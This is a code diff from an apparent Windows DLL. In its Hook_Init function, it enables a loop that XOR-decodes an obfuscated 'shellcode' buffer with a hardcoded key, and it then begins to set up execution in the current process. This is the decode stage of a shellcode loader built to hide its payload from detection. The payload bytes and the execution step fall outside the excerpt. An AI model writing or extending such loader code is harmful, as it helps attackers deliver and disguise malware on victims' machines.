@@ -177,13 +177,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 
 void Hook_Init()
 {
-	//char shellcode[928];
-	//char key[] = "aeyp^cc9boQEoHdq";
-	//int keySize = sizeof(key);
-	//int i;
-	//for (i = 0; i < sizeof(shellcode); i++) {
-		//shellcode[i] = obfs[i] ^ key[i % keySize];
-	//}
+	char key[] = "aeyp^cc9boQEoHdq";
+	int keySize = sizeof(key);
+	int i;
+	for (i = 0; i < sizeof(shellcode); i++) {
+		shellcode[i] = shellcode[i] ^ key[i % keySize];
+	}
 	void* pShellcode;
 	HANDLE hProcess = GetCurrentProcess();
 
